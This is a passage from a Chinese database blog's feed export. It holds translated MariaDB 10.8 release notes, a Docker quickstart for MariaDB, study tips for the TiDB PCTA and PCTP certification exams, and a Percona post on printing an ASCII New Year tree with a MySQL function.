<p>这些限定符遵循存储过程的语法，并考虑到在使用Oracle兼容模式（<code>sql_mode=ORACLE</code>）时与Oralce的差异。<br>
这一改进基于乐天证券的 Manohar KB 所做的社区贡献。</p>
</li>
</ul>
<h3 id="对于DevOps和DBA来说">对于DevOps和DBA来说</h3>
<ul>
<li><code>ALTER TABLE</code>用于复制的新优化。当启用 <strong><code>binlog_alter_two_phase = 1</code></strong>（非默认值）时，<code>ALTER TABLE</code>可以在主节点上执行，并在复制节点上复制和“启动”，或多或少地与主节点并行。因此，可以避免在主节点长时间执行<code>ALTER TABLE</code>而导致的主节点和复制节点之间的巨大复制延迟。</li>
<li>命令行工具 <strong>mariadb-binlog</strong> 现在支持对选项<code>start-position</code>和<code>stop-position</code>使用全局事务ID（GTID）。<br>
<strong>mariadb-binlog</strong> 现在可以用于生成由指定的GTID来过滤结果集。</li>
<li>SPIDER 存储引擎现在允许使用存储引擎定义属性（表选项），类似于其他存储引擎，且比现在通过<code>COMMENT</code>为表提供参数的方法更方便。</li>
<li>存储引擎定义属性现在也可以定义在每个分区上，以实现更灵活的配置。</li>
</ul>
<h3 id="服务器改进">服务器改进</h3>
<ul>
<li>关于JSON直方图可以显示详细直方图统计信息的改进，当设定 <strong>histogram_type=JSON_HB</strong> (非默认值)时。使用JSON直方图可以在字符串数据类型上或在列的数据分布高度不均匀时获得更精确的数据统计。更精确的统计数据允许优化器创建更好的查询计划，从而实现更快的查询。</li>
<li>更改InnoDB重做日志格式以减少写放大，从而提高性能。</li>
<li>MariaDB服务器现在可以使用OpenSSL 3.0库构建。</li>
<li>在最新版本的Windows（支持Windows 10 1909或更高版本、Windows 11、Windows Server 2020）上的MariaDB命令行工具支持完全unicode。服务器上的 <strong>my.ini</strong> 配置文件现在也用UTF8编码。命令行客户端 <strong>mariadb.exe</strong> 默认使用<strong>utf8mb4</strong> 。</li>
</ul>
<p>我们鼓励您今天就试用 <a class="link"   href="https://mariadb.com/downloads/#mariadb_platform-mariadb_server" >MariaDB Community Server 10.8 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> RC版本。请注意，我们不建议在生产环境中运行RC版本。</p>
<h2 id="资源">资源</h2>
<ul>
<li>博客: <a class="link"   href="https://mariadb.com/newsroom/press-releases/mariadb-announces-new-innovation-release-model/" >Innovation Release Model for MariaDB Community Server <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li>博客: <a class="link"   href="https://mariadb.com/resources/blog/announcing-mariadb-community-server-10-7-1-rc/" >MariaDB Community Server 10.7.1 RC <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li>下载 <a class="link"   href="https://mariadb.com/downloads/" >MariaDB Community Server 10.7 GA or 10.8 RC <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
</ul>
<hr>
<p><a class="link"   href="https://www.modb.pro/db/327673" >https://www.modb.pro/db/327673 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
]]></content>
      <categories>
        <category>MariaDB</category>
        <category>Translate</category>
      </categories>
      <tags>
        <tag>mariadb</tag>
        <tag>译文</tag>
        <tag>mariadb 10.7</tag>
        <tag>mariadb 10.8</tag>
      </tags>
  </entry>
  <entry>
    <title>[译] 用 Docker 三步开启 MariaDB 之旅</title>
    <url>/2022/mariadb/fanyi-get-started-with-mariadb-using-docker-in-3-steps/</url>
    <content><![CDATA[<blockquote>
<p>原文链接：<a class="link"   href="https://mariadb.com/resources/blog/get-started-with-mariadb-using-docker-in-3-steps/" >https://mariadb.com/resources/blog/get-started-with-mariadb-using-docker-in-3-steps/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>
原文作者：Rob Hedgpeth</p>
</blockquote>
<p>毫无疑问，在过去的十年里，MariaDB已成为最受开发人员欢迎的数据库之一。同时，由于它的开源性和起源于关系型数据库世界，许多技术人员可能已经将其作为一种解决方案而被吸引，这也只是MariaDB所提供的服务的冰山一角。</p>
<p>但是，这不是本文要讨论的。<a class="link"   href="https://mariadb.com/products/" >mariadb.com products page <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> ， <a class="link"   href="https://mariadb.com/docs/" >official documentation <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> ，还有 <a class="link"   href="https://mariadb.com/developers/" >MariaDB Developer Hub <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> ，这些站点里有大量的信息可以帮助您深入了解MariaDB所提供的大量特性和功能。</p>
<p>相反，本文的关注点是，您自己如何使用 <a class="link"   href="https://docs.docker.com/get-started/" >Docker容器 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 最快地在本地从零开始启动一个MariaDB数据库实例，运行以及准备好使用它。</p>
<p>好的，让我们开始吧。</p>
<h2 id="步骤1：安装Docker">步骤1：安装Docker</h2>
<p>除非您过去几年一直生活在石洞里，我知道您至少听过Docker，或者至少听过容器化的概念。如果没有，而且好奇的话，不妨看看 <a class="link"   href="https://www.docker.com/resources/what-container" >这篇文章 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 。</p>
<p>在开始使用Docker前，需要先下载安装 <a class="link"   href="https://www.docker.com/get-started" >Docker客户端 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 。</p>
<h2 id="步骤2：创建一个MariaDB的Docker容器">步骤2：创建一个MariaDB的Docker容器</h2>
<p>如果您已经在机器上成功安装了Docker，您可以拉取MariaDB镜像，然后启动拉起一个容器（将包含一个MariaDB数据库实例）。</p>
<p>这一步，您将使用寄放在 <a class="link"   href="https://hub.docker.com/" >https://hub.docker.com <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 站点上的 <a class="link"   href="https://hub.docker.com/_/mariadb" >MariaDB官方Docker镜像 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 。</p>
<p>打开一个新的终端，并且执行下面的命令。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">docker run -p 127.0.0.1:3306:3306  --name mdb -e MARIADB_ROOT_PASSWORD=Password123! -d mariadb:latest</span></span><br></pre></td></tr></table></figure></div>
<p>上面的语句将拉取最新版本的官方MariaDB镜像，并且在本地<code>localhost (127.0.0.1)</code>拉起一个新容器，暴露3306端口，允许您使用root用户和密码<code>Password123</code>来连接数据库。</p>
<p><strong>提示</strong>：我猜这个步骤2-b，您可以通过命令<code>docker ps</code>来确认这个<code>docker run</code> 命令已经成功的拉取MariaDB镜像，并启动一个容器，命令<code>docker ps</code>将显示您所有正在运行中的容器。</p>
<h2 id="步骤3：连接MariaDB">步骤3：连接MariaDB</h2>
<p>最后，您不需要安装任何其他东西就可以开始使用MariaDB。 现在，虽然您当然可以使用其他类型的客户端或工具来连接MariaDB数据库并与之通信，但为了进行简单的演练，您可以使用MariaDB Docker容器中包含的MariaDB命令行客户端。</p>
<p>执行下面的命令，使用命令行客户端连接MariaDB：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">docker <span class="built_in">exec</span> -it mdb mariadb --user root -pPassword123!</span></span><br></pre></td></tr></table></figure></div>
<p>应该得到下面这样的结果：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">Welcome to the MariaDB monitor.  Commands end with ; or g.</span><br><span class="line">Your MariaDB connection id is 4</span><br><span class="line">Server version: 10.6.3-MariaDB-1:10.6.3+maria~focal mariadb.org binary distribution</span><br><span class="line">Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.</span><br><span class="line">Type &#x27;help;&#x27; or &#x27;h&#x27; for help. Type &#x27;c&#x27; to clear the current input statement.</span><br><span class="line">MariaDB [(none)]&gt; </span><br></pre></td></tr></table></figure></div>
<p>就是这样！这就是连接MariaDB并开始使用（查询）所需的全部内容。</p>
<h2 id="更多信息">更多信息</h2>
<p>如果您想了解更多关于Docker和MariaDB的可能，或者关于MariaDB的其他特性和功能，一定要看 <a class="link"   href="https://mariadb.com/developers/" >Developer Hub <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 和我们新的 <a class="link"   href="https://github.com/mariadb-developers" >Developer Code Central GitHub organization <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 。</p>
<p>您还可以通过 <a class="link"   href="https://mariadb.com/docs/" >官方文档 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 更深入地研究MariaDB功能。</p>
<p>总之，是我们强大的社区成就是现在的我们! 如果您也想参与贡献，您可以在 <a class="link"   href="https://github.com/mariadb-corporation" >GitHub <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 上找到我们，直接发送反馈到我们的邮箱 <a class="link"   href="mailto:developers@mariadb.com" >developers@mariadb.com <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>，或加入到 <a class="link"   href="https://r.mariadb.com/join-community-slack?_ga=2.56664170.1725333671.1644918858-150853383.1641209969" >MariaDB Community Slack <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> !</p>
<p>编码快乐，朋友们!</p>
<hr>
<p><a class="link"   href="https://www.modb.pro/db/325093" >https://www.modb.pro/db/325093 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
]]></content>
      <categories>
        <category>MariaDB</category>
        <category>Translate</category>
      </categories>
      <tags>
        <tag>docker</tag>
        <tag>mariadb</tag>
        <tag>译文</tag>
      </tags>
  </entry>
  <entry>
    <title>TiDB 认证 | PCTA 认证需要掌握的知识点</title>
    <url>/2022/tidb/pingcap-cert-pcta/</url>
    <content><![CDATA[<p>机会从来都是留给有准备的人。2月17日晚8点将开始年后第一次 <a class="link"   href="https://learn.pingcap.com/learner/exam-market/list?category=PCTA" >PCTA 认证考试 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>，一起来看看这些知识点您都掌握了么？</p>
<p>TiDB基础运维能力认证考试，考查的重点在于对TiDB核心知识点的了解，比如下面这张TiDB架构图，是否可以做到不看原图自己动手画出来呢。</p>
<img  alt="tidbarchitecturev3.1.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20220215-273c87c6-7e0f-4bfb-a65c-930bbf72f435.png"
                      referrerpolicy="no-referrer"
                >
<p>PCTA认证考试的形式是单选题+多选题，共60道选择题，考试难度适中，没有公开题库。不建议从网上搜索题库，只需按部就班跟学视频课程 – <a class="link"   href="https://learn.pingcap.com/learner/course/30002" >301 TiDB 系统管理基础 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> ， 不明之处多查查官方文档 <a class="link"   href="https://docs.pingcap.com/zh/tidb/stable/" >TiDB 简介 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> ，再不懂的地方可以在 <a class="link"   href="https://www.modb.pro/issue" >问答板块 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 提问，或者在TiDB的问答社区 <a class="link"   href="https://asktug.com/" >AskTUG <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 提问，考试通过是水到渠成的事情了。</p>
<p>工欲善其事，必先利其器。先来谈谈“学习方法”，这虽是个老生常谈的话题，不过也是可以与时俱进，不断优化的。在备考PCTA和PCTP的过程中，我使用的是 <strong>“笔记+脑图”</strong> 的方法，两个重要的工具跟大家分享一下，笔记工具我使用的印象笔记，而脑图则用的是XMind。笔记工具其实还有很多选择项，比如OneNote，有道云笔记等。基于个人习惯我选择的是印象笔记，而且已使用多年，积累的笔记数已过万条。</p>
<img  alt="2.jpg" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20220215-ee71b5e9-a220-4691-9c9f-f8f38e7b994b.jpg"
                      referrerpolicy="no-referrer"
                >
<p>工具其实只是一款普通的软件，关键在于如何使用，如何提升生产力。比如印象笔记可以简单的按照两个维度来管理笔记，一个是笔记本，可以理解为文件夹，将所有笔记都放到一个笔记本里。另一个维度是标签，也可以称之为关键字，按照个人习惯来打tag，以便于检索。或者，换一种类比方式，印象笔记中的笔记本如同墨天轮上的合辑，每篇笔记就是一篇文章，每篇文章可以加5个标签。例如，我创建了一个名为<a class="link"   href="https://www.modb.pro/topic/242971" >国产数据库认证 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>的合辑，我们可以直接查阅这个合辑里的所有文章，或者可以通过标签<a class="link"   href="https://www.modb.pro/tag/pcta?type=knowledge" >pcta <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>、<a class="link"   href="https://www.modb.pro/tag/pctp?type=knowledge" >pctp <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>来分别查看打了这个标签的所有文章，当然也可以通过搜索框用关键字直接检索。不得不感叹，墨天轮真是个大知识库啊。</p>
<p>另外一个效率工具是XMind，一般是在完成第一版笔记后，用来重新整理思路的利器。比如下图就是我从PCTA课程笔记提炼出的思维导图。思维导图既是笔记的凝练，也是二次复习的指南针。需要说明的是，这种图可能略带主观性，建议有精力的同学可以依照自己的学习习惯和思路重新整理一份，这样印象也更加深刻。</p>
<img  alt="mindmap-pcta.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20220215-28fca6d5-d8a1-4880-a9f5-65845e858c37.png"
                      referrerpolicy="no-referrer"
                >
<p>正菜，参见上图，相信会对正在紧张复习PCTA的同学有所提示。<br>
有些容易混淆的概念，需要重点复习，这里提示一下，有如：</p>
<ol>
<li>三大核心组件的核心功能，及相关概念。</li>
<li>系统变量和集群配置的对比。</li>
<li>各种备份、数迁工具的比对，适用场景，及上下游关系。</li>
</ol>
<p>最后，祝各位同学元宵节快乐，预祝 PCTA 顺利过关！</p>
<h2 id="相关链接">相关链接</h2>
<ul>
<li><a class="link"   href="https://learn.pingcap.com/learner/certification-center/syllabus/pcta" >PCTA考试大纲 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li><a class="link"   href="https://docs.pingcap.com/zh/tidb/stable/" >官方文档 - TiDB 简介 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li><a class="link"   href="https://asktug.com/t/topic/513371" >【考试指南】PCTA&amp;PCTP 在线考试操作指南 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li><a href="https://shawnyan.cn/2022/tidb/pingcap-cert-pctp/">TiDB 认证 | 新版 PingCAP PCTP 认证考试 – 备考指南</a></li>
</ul>
<p>写于2022-02-15</p>
<hr>
<p>2022-02-16，追加更新。</p>
<p><strong>重要時間綫：</strong></p>
<blockquote>
<p>2015-04 PingCAP 成立<br>
2015-09 TiDB 在 GitHub 上开源，一个月 Star 数超过 2700<br>
2017-10 TiDB 1.0 GA 发版<br>
2018-04 TiDB 2.0 GA 发版<br>
2019-06 TiDB 3.0 GA 发版，TiDB User Group 正式成立<br>
2020-05 TiDB 4.0 GA 发版<br>
2020-09 CNCF 宣布 TiKV 正式从 CNCF 毕业<br>
2021-04 面向企业级核心场景的 TiDB 5.0 GA 发版</p>
</blockquote>
<p><strong>心法：</strong></p>
<ol>
<li>有目标的学习才能事半功倍</li>
<li>看图领悟，把书读薄</li>
<li>细节决定成败，无招胜有招</li>
</ol>
<p>End.</p>
<hr>
<p><a class="link"   href="https://www.modb.pro/db/324743" >https://www.modb.pro/db/324743 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
]]></content>
      <categories>
        <category>TiDB</category>
        <category>Education</category>
      </categories>
      <tags>
        <tag>tidb</tag>
        <tag>pingcap</tag>
        <tag>asktug</tag>
        <tag>pcta</tag>
        <tag>pingcap认证</tag>
        <tag>education</tag>
      </tags>
  </entry>
  <entry>
    <title>[译] 来自 Percona Support Team 的新年祝福！</title>
    <url>/2022/mysql/fanyi-percona-support-team-new-year-greetings/</url>
    <content><![CDATA[<blockquote>
<p>原文地址： <a class="link"   href="https://www.percona.com/blog/percona-support-team-new-year-greetings/" >https://www.percona.com/blog/percona-support-team-new-year-greetings/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>
原文作者： Sveta Smirnova</p>
</blockquote>
<h2 id="译文">译文</h2>
<img  alt="NYTree.gif" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20220129-23786ab8-fa74-4081-91f8-1e11bcb5fc76.gif"
                      referrerpolicy="no-referrer"
                >
<p>在Percona支持团队，我们每周花几个小时做这样的实验: 短期的集体项目，与工作任务没有直接关系。<br>
我们最近一次的实验是关于即将为冬季假期做准备，或者说我们将准备圣诞树并装饰它。 为此，我们使用了自己最喜欢的工具: MySQL和 <a class="link"   href="https://en.wikipedia.org/wiki/ASCII_art" >ASCII图像 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 。因此，我们创建了一个函数，并在终端中打印 [圣诞树](<a class="link"   href="https://en.wikipedia" >https://en.wikipedia <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>.<br>
org/wiki/New_Year_tree) ，并用我们想要的符号装饰它。</p>
<p>例如，要创建一个用星星装饰的三层树，函数调用方法如下:</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line">$ mysql ny_tree <span class="operator">-</span>e &quot;select ny_tree(3, &#x27;*&#x27;)&quot; <span class="comment">--vertical --skip-column-names -s</span></span><br><span class="line"><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span> <span class="number">1.</span> <span class="type">row</span> <span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span></span><br><span class="line"></span><br><span class="line">   <span class="operator">/</span>\</span><br><span class="line">  <span class="operator">/</span>__\</span><br><span class="line">  <span class="comment">/* \</span></span><br><span class="line"><span class="comment"> /____\</span></span><br><span class="line"><span class="comment"> /  * \</span></span><br><span class="line"><span class="comment">/______\</span></span><br><span class="line"><span class="comment">   ||</span></span><br></pre></td></tr></table></figure></div>
<p>因为MySQL支持Unicode，您可以使用任何符号，且使符号和空格的宽度一样。例如，您可以用蜡烛装饰你的圣诞树，而不会有点燃你家的风险:</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line">$ mysql ny_tree <span class="operator">-</span>e &quot;select ny_tree(4, &#x27;🕯&#x27;)&quot; <span class="comment">--vertical --skip-column-names -s</span></span><br><span class="line"><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span> <span class="number">1.</span> <span class="type">row</span> <span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span></span><br><span class="line"></span><br><span class="line">    <span class="operator">/</span>\</span><br><span class="line">   <span class="operator">/</span>__\</span><br><span class="line">   <span class="operator">/</span>🕯 \</span><br><span class="line">  <span class="operator">/</span>____\</span><br><span class="line">  <span class="operator">/</span>🕯  🕯\</span><br><span class="line"> <span class="operator">/</span>______\</span><br><span class="line"> <span class="operator">/</span>🕯🕯 🕯  \</span><br><span class="line"><span class="operator">/</span>________\</span><br><span class="line">    <span class="operator">||</span></span><br></pre></td></tr></table></figure></div>
<p>您可以将终端的颜色更改为看起来更喜庆的颜色，将终端的大小与树中的层数对齐，并在循环中调用函数以获得动态图像。<br>
例如，本文开头的动图是由以下这个命令实现的:</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line">$ <span class="keyword">for</span> i <span class="keyword">in</span> `seq <span class="number">1</span> <span class="number">1</span> <span class="number">1000</span>`; do mysql ny_tree <span class="operator">-</span>e &quot;select &#x27;\\nHappy New 2022 Year\!&#x27;, ny_tree(12, &#x27;⚝&#x27;)&quot; <span class="comment">--vertical --skip-column-names -s; sleep 1; done</span></span><br></pre></td></tr></table></figure></div>
<p>我只需调整终端的尺寸并符合树的层数。<br>
<code>ny_tree</code>和两个辅助函数的代码位于 <a class="link"   href="https://github.com/Percona-Lab/ny-tree" >https://github.com/Percona-Lab/ny-tree <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>
我们，Percona支持团队，祝您新年快乐，在新的一年里数据库平稳运行!</p>
<hr>
<h2 id="译者注">译者注</h2>
<p>在导入函数时，如果遇到报错：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">ERROR 1418 (HY000): This function has none of DETERMINISTIC, NO SQL, or READS SQL DATA in its declaration and binary logging is enabled (you *might* want to use the less safe log_bin_trust_function_creators variable)</span><br></pre></td></tr></table></figure></div>
<p>则只需调整这个参数即可：<code>set global log_bin_trust_function_creators = true;</code></p>
<p>本地实测好用！so cool!</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> `seq <span class="number">1</span> <span class="number">1</span> <span class="number">1000</span>`; do mysql <span class="operator">-</span>uroot sbtest <span class="operator">-</span>e &quot;select &#x27;\\n新春快乐，虎年大吉！卧虎藏喵，全力以富！\!&#x27;, ny_tree(12, &#x27;*&#x27;)&quot; <span class="comment">--vertical --skip-column-names -s; sleep 1; done</span></span><br></pre></td></tr></table></figure></div>
<img  alt="20220129_175543.jpg" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20220129-a0ca0f47-c969-4243-9c2d-ce7b3e590200.jpg"
                      referrerpolicy="no-referrer"
                >
<p><a class="link"   href="https://github.com/shawn0915/ny-tree" >https://github.com/shawn0915/ny-tree <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
]]></content>
      <categories>
        <category>MySQL</category>
        <category>Translate</category>
      </categories>
      <tags>
        <tag>mysql</tag>
        <tag>percona</tag>
        <tag>译文</tag>
        <tag>sql</tag>
      </tags>
  </entry>
  <entry>
    <title>TiDB 认证 | 新版 PingCAP PCTP 认证考试 备考指南</title>
    <url>/2022/tidb/pingcap-cert-pctp/</url>
    <content><![CDATA[<h2 id="关于-PCTA-PCTP-PCAD">关于 PCTA / PCTP / PCAD</h2>
<p><a href="https://learn.pingcap.com/learner/certification-center/pcta"><strong>PCTA</strong></a> （PingCAP Certified TiDB Associate）是 PingCAP 公司认证 TiDB 数据库专员的缩写。PCTA 要求具备安装部署及日常运维分布式关系型数据库的能力。PCTA 需要学习并熟练掌握 TiDB 架构原理、安装部署、周边工具等基础知识。</p>
<p><img  
                     lazyload
                     src="/img/loading.svg"
                     data-src="/2022/tidb/pingcap-cert-pctp/ta.jpg"
                      alt="ta.jpg" loading="lazy"
                ></p>
<p><a href="https://learn.pingcap.com/learner/certification-center/pctp"><strong>PCTP</strong></a>（PingCAP Certified TiDB Professional）是 PingCAP 公司认证 TiDB 数据库专家的缩写。 PCTP 要求具备管理大型分布式关系型数据库集群的能力。 PCTP 需要学习并熟练掌握 TiDB 的深度原理及高级 Feature、性能调优、SQL 优化、故障排除和高可用架构等进阶内容。 要成为 PCTP 必须先获得 PCTA 认证。</p>
<p><img  
                     lazyload
                     src="/img/loading.svg"
                     data-src="/2022/tidb/pingcap-cert-pctp/tp.jpg"
                      alt="tp.jpg" loading="lazy"
                ></p>
<p><a href=""><strong>PCAD</strong></a> (PingCAP Certified Application Developer) PingCAP 认证应用开发专家（简称 PCAD）是 PingCAP 对于应用开发工程师基于 TiDB 全线产品应用开发、迁移、优化和故障解决能力的认证，要求应用开发工程师熟练掌握基于 TiDB 数据库事务开发模型、数据模型设计、系统优化、SQL 优化和索引设计等知识。<br>
<em>(课程开发中…)</em></p>
<h2 id="PCTP-学习资料">PCTP 学习资料</h2>
<p>PCTP的学习资料主要有两个：</p>
<ol>
<li>官方提供的在线课程 – <a class="link"   href="https://learn.pingcap.com/learner/course/120005" >302 TiDB 高级系统管理 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
</ol>
<p>TiDB高级系统管理的全新课程已正式上线，形式为在线视频课程，原价￥2899，现在限时免费。<br>
内容基于 <strong>TiDB v5.0</strong>，课程内容丰富，全部课程时长为1425分钟(23.75小时)，分为8个大模块，共31节课，每节课程后面都带有课后习题或相关实验。</p>
<p>八个课程模块分别为：<br>
Module 1： 深入 TiDB 体系结构<br>
Module 2： TiDB 数据库 schema 设计<br>
Module 3： TiDB 数据库 HTAP 技术<br>
Module 4： TiDB 数据库事务设计<br>
Module 5： TiDB 数据库查询优化<br>
Module 6： TiDB 数据库系统优化<br>
Module 7： TiDB 数据库故障处理<br>
Module 8： TiDB 数据库高可用设计</p>
<ol start="2">
<li>官方文档</li>
</ol>
<p>官方文档直通车 =&gt; <a class="link"   href="https://docs.pingcap.com/zh/tidb/stable/" >TiDB简介 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>
建议直接看最新稳定版本，当前版本为 TiDB v5.3</p>
<h2 id="PCTP-考试形式">PCTP 考试形式</h2>
<p>PCTP 考试为远程在线考试，考试时长 90 分钟，共 70 道题（单选 35 道，多选 35 道，每题 1 分）满分 70 分，42 分为及格 （通过线以答题正确率 60% 为基准，根据试卷难度系数，略有小幅波动）</p>
<p>笔者考试时是在家里，把自己关进小黑屋，考试前将微信、钉钉等聊天工具关闭，只保留考试用的浏览器，考试期间全程需要开摄像头进行人脸识别，此时网络的稳定性显得尤为重要。</p>
<h2 id="PCTP-考试日程">PCTP 考试日程</h2>
<p>今年第一场考试是在昨天（1月26日）举行的，考试入场时间为19:30~19:45，考试时间为90分钟，只有一次考试机会，错过入场窗口期考试机会自动作废，这次考试的考试券是通过参加活动免费获得的，活动链接点这里 =&gt; <a class="link"   href="https://asktug.com/t/topic/303174" >【课程上新】系统学习 TiDB，成为 TiDB 数据库专家，有它就够了！ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>， 简单的说，就是需要在1月17日前学习302课程，学习进度到80%以上，会通过站内信收到考试券及考试提醒。</p>
<blockquote>
<p>与本次考试失之交臂怎么办？</p>
</blockquote>
<p>（2022-01-28）笔者从@TiDB学习助手 那里了解到，年后会推出新的日程安排，会有收费政策，不过可能会有赢得免费考试券的机会，还是静心期待一下吧。</p>
<p>（2022-01-29）最新认证政策：</p>
<ol>
<li>推荐课程：302 TiDB 高级系统管理；完成条件：学习进度 80% 及以上</li>
<li>PCTP 认证考试平均每 1 个月开放一场</li>
<li>完成《302 TiDB 高级系统管理》课程学习可解锁 1 人次指定场次 PCTP 免费考试权益</li>
<li>直接<a class="link"   href="https://learn.pingcap.com/learner/exam-market/list?category=PCTP" >报名考试 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>，考试费￥699</li>
</ol>
<p>（2022-02-09）获取考试券其他途径：</p>
<ol>
<li>可以通过社区积分进行兑换： <a class="link"   href="https://accounts.pingcap.com/points#/shop" >PCTP认证考试资格 4000积分 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li>成为 TiDB <a class="link"   href="https://asktug.com/t/topic/94035" >社区版主 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 任职期间，免费获得 PCTP 考证免费兑换券，有效期 12 个月</li>
</ol>
<blockquote>
<p>2022-03-02</p>
</blockquote>
<p>PCTP 考试费已上调至￥900</p>
<blockquote>
<p>2022-03-10</p>
</blockquote>
<p>2022年3月14日24:00前课程学习进度80%及以上即可获得1个PCTP考试兑换码</p>
<p>近期考试安排：</p>
<ul>
<li><a class="link"   href="https://learn.pingcap.com/learner/exam-market/list?category=PCTA" >PCTA <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>
<ul>
